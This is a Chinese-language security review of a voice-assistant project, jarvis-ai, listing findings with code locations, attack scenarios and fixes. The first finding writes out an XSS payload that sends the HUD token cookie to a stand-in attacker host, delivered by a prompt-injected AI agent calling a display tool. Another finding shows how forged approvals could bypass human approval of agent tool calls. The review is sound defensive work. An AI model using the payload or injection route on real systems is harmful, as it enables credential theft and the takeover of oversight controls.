# jarvis-ai 安全评审（安全+渗透视角）

日期：2026-08-25
范围：`server/server.py`（1552 行）、`server/hud/index.html`（1085 行）、`client/client.py`、`worker/*.py`、`server/scripts/*.sh`、`hermes-plugin/hud_display/tools.py`
基线：WS fail-closed 认证、代理路径穿越防护、`/api/auth/check` 探针、SSE 无 delta 兜底均已确认生效；全量测试 24/24 通过。

统计：**P0 = 0，P1 = 3，P2 = 11**

---

## P1

### [P1] HUD 全息面板 HTML 注入 → XSS → 窃取 `jarvis_token` cookie
- **位置**：`server/hud/index.html:851-871`（`summonPanel`），配合 `server/server.py:1106-1130`（`/api/summon`）
- **问题**：当 `media != image/video`（**默认即 iframe**）时，`embedURL(src)` 对非 YouTube 链接**原样返回 `src`，未经任何编码或转义**，直接拼进双引号属性：`` `<iframe class="holoContent" src="${embedURL(src)}" ...>` ``。含 `"` 的 src 可闭合属性并注入任意 HTML/事件处理器。同时 `${title}` 也未转义直接插入 `<span>◈ ${title}</span>`（image/video 分支虽有 `encodeURI`，但 `encodeURI` 不转义单引号与反引号，防御同样不完整）。服务端 `/api/summon` 对 `src` 无 scheme 校验、对 `title` 无长度限制（插件层 `tools.py` 有 `http(s)` 前缀校验和 48 字符截断，但直连 REST 路径绕过这些约束）。
- **攻击场景**：Hermes 智能体被提示注入（或其工具输出被污染）后调用 `hud_display`/`/api/summon`，src 设为 `https://evil/x"><img src=x onerror="fetch('//attacker/?c='+document.cookie)">`。面板在受信任的 HUD 页面执行任意 JS；`jarvis_token` cookie 由 JS 写入、无 HttpOnly（index.html:910），可被读取，攻击者随即获得全部 `/api/*` 与 WS 权限。页面无 CSP 缓解。
- **修复**：
  1. 前端用 DOM API（`createElement` + `el.src = url`）构建面板，或对 src/title 统一做 HTML 实体转义后再插值；
  2. 服务端 `/api/summon` 校验 `src` 必须以 `http://`/`https://` 开头（与插件一致）、限制 `title` 长度与字符集；
  3. 给 HUD 响应加 CSP（如 `default-src 'self'; frame-src https:`），并为 `jarvis_token` 提供只读探针替代明文 cookie。

### [P1] 主 WS 音频缓冲无上限 → 认证后内存/CPU 放大 DoS
- **位置**：`server/server.py:1495-1498`（无上限 append）、`1411-1431`（partial 仅调度护栏）、`1103`/`1440`（连接数无上限）
- **问题**：`recording=True` 期间每个二进制帧无条件 `conn.audio_chunks.append(...)`，直到客户端发 `stop` 才拼接释放；没有任何总字节/时长上限（`_maybe_schedule_partial` 的 `len(buf) > 30s` 检查只是跳过 partial 转写，不阻止累积）。partial 路径还会对最多 30s 音频反复跑 Whisper（默认每 1.2s 新音频一次）。`WS_CLIENTS` 与并发连接数也没有上限。
- **攻击场景**：持有 token（或从本机 loopback 免认证）的恶意进程开 N 条 WS 连接，各发一条 `start` 后持续灌二进制帧不发 `stop`——服务器 RAM 线性增长直至 OOM；或单连接持续录音使 Whisper partial 占满 CPU，语音助手整体不可用。
- **修复**：为 `audio_chunks` 设置硬上限（如 30–60s 音频 ≈ 1–2 MB，超限丢弃最旧或直接报错断开）；限制并发 WS 连接数（如 ≤8）与每连接录音轮次；partial 触发频率加节流。

### [P1] dashboard 代理 WS 在未配置 token 时 fail-open
- **位置**：`server/server.py:1248-1255`（`dash_ws_proxy`）
- **问题**：`if token and ws.cookies.get("jarvis_token") != token: close` —— 当 `hud_token()` 返回 None（未配置 `JARVIS_HUD_TOKEN`）时条件整体为假，WS **不经认证直接 accept** 并完整反代 dashboard（含其查询串）。同文件的 HTTP 侧中间件（1211-1221 行）在未配置时返回 503，是 fail-closed；两条路径行为不一致。
- **攻击场景**：部署时遗漏环境变量（启动日志仅一次性 WARNING）。LAN 上任意主机向 `wss://host:9443/<ws-path>` 发起 WebSocket 即可获得与 dashboard 相同的实时通道，绕过本应"未配置即全拒"的预期。
- **修复**：改为与 HTTP 中间件一致的 fail-closed：`if not token: await ws.close(code=4503); return`，再校验 cookie。

---

## P2

### [P2] token 比较非常量时间
- **位置**：`server/server.py:887`（`supplied == token`）、`932`、`939`（WS cookie/query 比较）、`1252`（dash WS cookie 比较）
- **问题**：所有共享密钥比较均用 `==`，理论上可被逐字节计时侧信道利用。
- **攻击场景**：LAN 内高精度测量 401 延迟差逐字符恢复 token。局域网抖动大、token 为高熵随机串时实际可行性低。
- **修复**：统一改 `hmac.compare_digest(supplied, token)`（注意先编码为 bytes）。

### [P2] WS token 走 URL 查询参数
- **位置**：`server/server.py:932`、`939`（`ws.query_params.get("token")`）；测试脚本亦如此使用（`scripts/jarvis-full-test.sh:70,98`）
- **问题**：URL 中的凭据会进入浏览器历史、代理/访问日志、uvicorn 日志行。
- **攻击场景**：调试排障时贴出的日志/截图泄露长效 token（cookie 有效期 1 年）。
- **修复**：改用握手子协议（`Sec-WebSocket-Protocol`）或在 accept 后首帧 challenge-response；至少在文档中标记 query 参数仅为兼容并尽快移除。

### [P2] `/api/machines`、`/api/usage` 公开暴露基础设施信息
- **位置**：`server/server.py:878`（`_PUBLIC_API_PATHS`）、`1136-1189`、`1038-1093`
- **问题**：这两个端点显式跳过认证，返回主机名（"MAC MINI · HERMES"）、CPU/内存/磁盘占用、已配置 worker 的名称与在线状态（间接泄露 LAN 拓扑）、ElevenLabs 配额/套餐、LLM 用量与费用估算。`/api/usage` 还会以缓存过期为由触发对 ElevenLabs 的出站请求（未认证即可驱动， albeit 5 分钟节流）。
- **攻击场景**：LAN 上任何设备（访客 Wi-Fi/IoT）`curl http://mac-mini:8765/api/machines` 即可绘制内网资产画像，为后续定向攻击提供侦察数据。
- **修复**：将两者移出公开列表；若 HUD 未登录页需要部分数据，降级为脱敏版（仅布尔在线状态，不含主机名/费用）。

### [P2] 异常原文回传客户端并落入日志（信息泄露）
- **位置**：`server/server.py:1356`（`ws.send_json({"type":"error","message":str(exc)})`）、`1032`（`{"error": str(exc)}`）、`1354`/`815-817`（errors 写入 `logs/latency.jsonl` 并打印）、`260`、`311`（Hermes 错误体前 300 字符进异常链）
- **问题**：上游错误体、内部 URL、session id、路径等原样透传给客户端；同时每轮的完整 transcript 与 response 明文写入 `latency.jsonl`/stdout——`SECRET_RES` 脱敏只作用于 TTS 朗读文本（801-802 行），**不作用于落盘的 `response_text`**。
- **攻击场景**：诱导 Hermes 返回包含敏感内容的回复（如用户让助手读密码管理器条目），回复连同可能的密钥形态字符串永久落盘于 latency.jsonl；错误消息帮助攻击者绘制内部拓扑。
- **修复**：对外错误映射为固定短消息（保留 detail 于服务端日志并对日志应用 SECRET_RES 脱敏）；latency.jsonl 写入前过一遍 SECRET_RES。

### [P2] token 在线爆破无速率限制
- **位置**：`server/server.py:890-906`（中间件，无计数/延迟）、`1096-1100`（`/api/auth/check` 为稳定 200/401 判定器）
- **问题**：任意端点（尤其 `/api/auth/check`）都是零成本、无节流的 token oracle；HUD PIN 门（index.html:908-914）也无前端限速。
- **攻击场景**：LAN 攻击者高频猜测 `JARVIS_HUD_TOKEN`；若安装器生成了低熵 PIN 式 token 则可行。
- **修复**：按源 IP 失败计数 + 指数退避（如 5 次失败封禁 60s）；确保 token 由 `secrets.token_urlbytes` 类高熵来源生成。

### [P2] GPU STT worker 默认 fail-open 且请求体无上限
- **位置**：`worker/stt_server.py:40`（`TOKEN = os.environ.get(..., "")`）、`60`（`if TOKEN and ...`）、`62`（body 无大小上限）、`75`（transcript 片段打印到 stdout）
- **问题**：未设置 `JARVIS_STT_TOKEN` 时 `/stt` 对整个 LAN 开放；任意大小 POST 直接进 Whisper（GPU），转录结果片段写日志。
- **攻击场景**：LAN 攻击者发现 8768 端口后可免费消耗 GPU、以超大音频文件拖垮 worker，并通过日志窥探他人语音内容片段。
- **修复**：token 缺失时拒绝服务（fail-closed）；限制 body 上限（如 30s×32KB/s ≈ 1MB）；删除 transcript 打印或截断为长度统计。

### [P2] 双 `stop` 产生并发重复 turn（barge-in 竞态）
- **位置**：`server/server.py:1470-1476`（每次 `stop` 无条件 `create_task` 覆盖 `conn.turn_task`）、`1459-1460`
- **问题**：第一个 turn 仍在运行时再次收到 `stop` 会创建第二个并发 turn 并覆盖 `conn.turn_task` 引用——旧任务成为孤儿，继续向同一 ws 写音频/JSON，且与新任务竞争 `conn.spoken_sentences`/`interrupt_note`。
- **攻击场景**：畸形/恶意客户端交替快速发送 `stop`+`start`，造成交错输出、状态错乱，放大资源消耗；正常用户快速操作也可能触发。
- **修复**：创建新 turn 前检查 `conn.turn_task` 是否活跃，活跃则先 cancel 并 await（复用 `_cancel_active_turn`），或将 `stop` 在有活跃 turn 时视为 barge-in。

### [P2] `conversation` 名完全由客户端控制且无校验
- **位置**：`server/server.py:1461-1462`（WS `start` 事件覆盖 `conn.conversation`）、`212-232`（名字作为 hermes_sessions.json 键与远端 session 标题）
- **问题**：任意字符串（无长度/字符集限制）被用于创建 Hermes 会话并持久化进 `hermes_sessions.json`，可无限增长。
- **攻击场景**：脚本化连接用随机 conversation 名发 `start`/`stop`，每次都在 Hermes 侧创建真实会话——远端会话表与本地状态文件被垃圾填满（持久资源耗尽）。
- **修复**：白名单会话名（如 `^[A-Za-z0-9_-]{1,64}$`），或仅允许配置中预定义的会话集合；状态文件加条目数上限。

### [P2] `approval_decision` 可操作任意 run_id
- **位置**：`server/server.py:1480-1492`（`event.get("run_id") or conn.current_run_id` 直通 `post_approval`）
- **问题**：客户端提供的 run_id 不校验是否属于本连接的当前 run，直接转发到 Hermes 批准接口。
- **攻击场景**：持 token 的受损 HUD/脚本可以批准或拒绝同一 Hermes 实例上其他会话（如用户的桌面 Agent 会话）待审批的危险工具调用，将"人工批准"防线变成攻击面。
- **修复**：仅接受 `conn.current_run_id` 匹配的 run；或维护本连接可见 run_id 集合并拒绝未知 run。

### [P2] `_STATE_LOCK` 持锁跨网络调用
- **位置**：`server/server.py:216-232`（`with _STATE_LOCK:` 内执行 `requests.post(timeout=15)`）
- **问题**：Hermes API 缓慢/不可达时锁最长被占 15s，期间所有语音 turn 的 `get_session_id` 全部阻塞。
- **攻击场景**：能干扰到 Hermes API 可达性（或令其过载）的攻击者可借此冻结语音管线；即便无攻击者，也是可用性缺陷。
- **修复**：先在锁外创建会话，仅在最终 read-modify-write 时短暂持锁（二次读-合并模式已有雏形，把 POST 移出锁即可）。

### [P2] HUD 静态目录整体未认证暴露
- **位置**：`server/server.py:1197-1198`（`app.mount("/hud", StaticFiles(...))`，不在 `/api/` 中间件覆盖范围）
- **问题**：`/hud/**` 下所有文件免认证可下载，包括 Piper 中文模型（`hud/tts/zh_CN-huayan-medium.onnx` 等，见 tts_piper.py 路径）、boot 音频等；明文 8765 端口同样可达。
- **攻击场景**：低价值（模型本身非机密），但确认了资产存在与版本特征，便于指纹识别；也意味着未来任何人误放敏感文件进 `hud/` 都会被动公开。
- **修复**：接受现状则至少在 README 标注该目录完全公开；更稳妥是把大体积模型/音频移出静态根，或给静态挂载加 token 中间件。

### [P2] Python 客户端无法携带 token（功能性安全缺口）
- **位置**：`client/client.py:37`（`DEFAULT_SERVER`）、`324`（`websockets.connect(args.server)` 无任何凭据参数）
- **问题**：服务端要求非浏览器、非 loopback 的 WS 连接必须带 token（server.py:931-933），但客户端既不发 cookie 也不发 query token——远程部署时必然被 4401 拒绝，实际使用者被迫退回"无 token"部署或临时改代码。
- **攻击场景**：无直接攻击，但它激励弱化服务端认证（例如有人会去掉 fail-closed 逻辑让客户端能用），属于安全设计退化诱因。
- **修复**：为 client 增加 `--token` 参数，通过 `Sec-WebSocket-Protocol` 或首帧认证发送；文档同步更新。

---

## 已核查、无需整改的点（避免误报）

- **代理路径穿越**：`_proxy_allowed`（951-967 行）先拒百分号编码、再 normpath 拒 `..` 与归一化不等，测试用例覆盖 `..%2f` 与 `/../admin/messages`——实现正确。
- **subprocess 注入**：`say` 以 argv 传参（587、623 行）、edge/piper wrapper 走 stdin，无 shell 拼接；临时 wav 用 `mkstemp` 且 finally 清理。
- **CSRF**：cookie 带 `SameSite=Lax; Secure`（index.html:910），跨站 fetch/XHR 不会附带 cookie，`/api/*` 变更端点实质免疫经典 CSRF；DNS rebinding 因 cookie 域绑定 + fail-closed 认证而无法读取数据。
- **中间件顺序**：认证中间件在路由/静态挂载前注册，`/api/*` 覆盖完整；大小写变体（`/Api/`）落入 404，无绕过。
- **审批卡片/活动流 XSS**：`showApproval`、`addActivity` 均做了实体转义（index.html:475、498）。
